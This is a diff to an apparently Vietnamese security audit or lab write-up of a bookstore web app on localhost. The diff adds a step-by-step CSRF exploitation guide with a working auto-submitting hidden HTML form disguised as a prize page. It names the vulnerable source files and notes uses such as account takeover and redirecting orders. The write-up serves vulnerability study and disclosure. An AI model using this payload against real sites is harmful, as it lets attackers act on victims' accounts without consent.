@@ -437,18 +437,94 @@ Sau khi có `password_hash` từ IDOR, attacker có thể:
 ## 5. 🟡 CSRF (Cross-Site Request Forgery)
 
 ### Mô tả
-Toàn bộ form và API **không có CSRF token**. Lỗ hổng này **không bị Cloudflare WAF chặn**.
+**CSRF** là lỗ hổng cho phép attacker **lừa nạn nhân thực hiện hành động trên web app** mà nạn nhân không biết, bằng cách tạo một trang web chứa form ẩn tự động submit.
 
-### Khai thác (HTML tự submit)
+Trong JVA Bookstore:
+- Hệ thống sử dụng **session-based auth** (cookie `JSESSIONID`) song song với JWT
+- Cookie `JSESSIONID` được trình duyệt **tự động gửi kèm** mọi request đến `localhost:8081`, kể cả từ trang web khác
+- API **không kiểm tra CSRF token**, không kiểm tra `Origin`/`Referer` header
+- Endpoint `POST /api/profile/addresses` chấp nhận dữ liệu **form-urlencoded** → HTML form có thể exploit
+
+**Lỗ hổng nằm ở:**
+- `AuthUtil.java` (dòng 95-107): Fallback sang session auth khi JWT không có
+- `ProfileServlet.java` (dòng 827-890): `createUserAddress()` chấp nhận form-urlencoded
+- `JwtFilter.java` (dòng 41-43): Cho phép session-based auth qua filter
+
+**Lỗ hổng này KHÔNG bị Cloudflare WAF chặn** vì request hoàn toàn hợp lệ.
+
+### Hướng dẫn khai thác chi tiết (Step-by-step)
+
+---
+
+#### 🔹 Bước 1: Nạn nhân đăng nhập vào bookstore
+
+Nạn nhân truy cập `http://localhost:8081/login.jsp` và đăng nhập bình thường.
+→ Server tạo session và trả về cookie `JSESSIONID`.
+
+---
+
+#### 🔹 Bước 2: Attacker tạo trang web chứa CSRF exploit
+
+Lưu file HTML sau (ví dụ `csrf-attack.html`):
+
 ```html
-<body onload="document.getElementById('f').submit()">
-  <form id="f" action="http://localhost:8081/api/profile/addresses" method="POST">
-    <input type="hidden" name="recipientName" value="HACKER">
-    <input type="hidden" name="phone" value="0000000000">
-    <input type="hidden" name="line1" value="Hacked Address">
+<!DOCTYPE html>
+<html>
+<head><title>🎁 Chúc mừng! Bạn đã trúng thưởng!</title></head>
+<body onload="document.getElementById('csrf-form').submit()">
+  <h1>🎉 Đang xử lý giải thưởng... 🎉</h1>
+
+  <!-- Form ẩn tự động submit -->
+  <form id="csrf-form" style="display:none"
+        action="http://localhost:8081/api/profile/addresses" method="POST">
+    <input type="hidden" name="recipientName" value="ATTACKER - CSRF ATTACK">
+    <input type="hidden" name="phone"         value="0666666666">
+    <input type="hidden" name="line1"         value="Dia chi bi hack qua CSRF">
+    <input type="hidden" name="district"      value="Quan Hacker">
+    <input type="hidden" name="city"          value="TP Hack City">
+    <input type="hidden" name="note"          value="Address injected via CSRF">
   </form>
 </body>
+</html>
 ```
+
+---
+
+#### 🔹 Bước 3: Gửi link cho nạn nhân
+
+Nạn nhân mở trang `csrf-attack.html` (qua email, chat, link shortener...).
+→ Trình duyệt tự động submit form + gửi kèm cookie `JSESSIONID`.
+→ Server nhận request hợp lệ + session auth thành công → **tạo địa chỉ mới trên tài khoản nạn nhân**.
+
+---
+
+#### 🔹 Bước 4: Kiểm tra kết quả
+
+Nạn nhân kiểm tra danh sách địa chỉ:
+```bash
+curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile/addresses"
+```
+
+**Kết quả:** Xuất hiện địa chỉ mới `"ATTACKER - CSRF ATTACK"` mà nạn nhân không hề tạo!
+
+---
+
+#### 🔹 Tại sao CSRF hoạt động?
+
+```
+Nạn nhân đăng nhập → Server tạo session (JSESSIONID cookie)
+                         ↓
+Nạn nhân mở trang attacker → Form ẩn submit đến /api/profile/addresses
+                         ↓
+Trình duyệt gửi kèm JSESSIONID cookie (tự động!)
+                         ↓
+Server thấy session hợp lệ → Tạo address → CSRF thành công ✅
+```
+
+> **📌 Trong thực tế**, CSRF có thể được dùng để:
+> - Thay đổi email/mật khẩu nạn nhân → Account Takeover
+> - Thêm địa chỉ giao hàng của attacker → Chuyển hướng đơn hàng
+> - Đặt hàng thay nạn nhân → Mất tiền
 
 ---
 
